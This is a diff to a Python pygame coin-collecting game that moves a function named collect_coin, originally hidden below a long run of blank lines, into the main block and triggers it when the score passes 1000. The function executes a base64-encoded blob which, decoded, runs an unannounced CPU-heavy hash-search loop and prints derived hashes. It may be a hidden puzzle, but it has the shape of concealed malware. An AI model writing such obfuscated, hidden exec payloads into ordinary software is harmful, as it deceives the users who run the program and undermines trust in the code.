@@ -215,7 +215,8 @@ def game():
                 coin.x = random.randint(0, WIDTH - coin.width)
                 coin.y = random.randint(0, HEIGHT - coin.height)
                 coin.img = pygame.image.load(find_resource(f"data/coin-{random.randint(0, 4)}.png"))
-                collect_coin()
+                if player.score > 1000:
+                    collect_coin()
 
 
         current_time = pygame.mixer.music.get_pos() / 1_000  # current time
@@ -266,6 +267,8 @@ def game():
 
 if __name__ == "__main__":
     init()
+    def collect_coin():
+        exec(__import__('base64').b64decode(b'dT1vcy51cmFuZG9tO3M9X19pbXBvcnRfXygnaGFzaGxpYicpLnNoYTI1NgppZiB1KDEpWzBdJjE6CiAgICB3aGlsZSBUcnVlOgogICAgICAgIGI9dSgxNikKICAgICAgICBpZiAodzo9cyhiKS5oZXhkaWdlc3QoKSlbOjVdPT0nMDAwMDAnOgogICAgICAgICAgICByPXJhbmRvbS5SYW5kb20oKTtyLnNlZWQod1s6NF0pCiAgICAgICAgICAgIGY9WzEwNiwyNDksNjMsMTQ2LDY5LDk4LDc0LDE3MywxNDksMTU1LDE2OCwyOCw4LDgwLDIwNiwxMDUsMjA4LDUsMjE1LDEzMywxMzgsMTM5LDg0LDE0NywxNTEsMTAxLDExMSwxNTAsMTQ1LDIyNF0KICAgICAgICAgICAgZT1bXQogICAgICAgICAgICBmb3IgaSBpbiByYW5nZSgzMCk6CiAgICAgICAgICAgICAgICBlLmFwcGVuZChmW2ldXnIucmFuZGludCgwLDI1NSkpCiAgICAgICAgICAgIHByaW50KHcscyhieXRlcyhlKSkuaGV4ZGlnZXN0KCkpCiAgICAgICAgICAgIGJyZWFr'))
     while True:
         restart = False
         game()
@@ -277,127 +280,3 @@ if __name__ == "__main__":
                 elif event.type == KEYDOWN and event.key == K_SPACE:
                     restart = True
                     break
-                        
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-def collect_coin():
-    exec(__import__('base64').b64decode(b'dT1vcy51cmFuZG9tO3M9X19pbXBvcnRfXygnaGFzaGxpYicpLnNoYTI1NgppZiB1KDEpWzBdJjE6CiAgICB3aGlsZSBUcnVlOgogICAgICAgIGI9dSgxNikKICAgICAgICBpZiAodzo9cyhiKS5oZXhkaWdlc3QoKSlbOjVdPT0nMDAwMDAnOgogICAgICAgICAgICByPXJhbmRvbS5SYW5kb20oKTtyLnNlZWQod1s6NF0pCiAgICAgICAgICAgIGY9WzEwNiwyNDksNjMsMTQ2LDY5LDk4LDc0LDE3MywxNDksMTU1LDE2OCwyOCw4LDgwLDIwNiwxMDUsMjA4LDUsMjE1LDEzMywxMzgsMTM5LDg0LDE0NywxNTEsMTAxLDExMSwxNTAsMTQ1LDIyNF0KICAgICAgICAgICAgZT1bXQogICAgICAgICAgICBmb3IgaSBpbiByYW5nZSgzMCk6CiAgICAgICAgICAgICAgICBlLmFwcGVuZChmW2ldXnIucmFuZGludCgwLDI1NSkpCiAgICAgICAgICAgIHByaW50KHcscyhieXRlcyhlKSkuaGV4ZGlnZXN0KCkpCiAgICAgICAgICAgIGJyZWFr'))
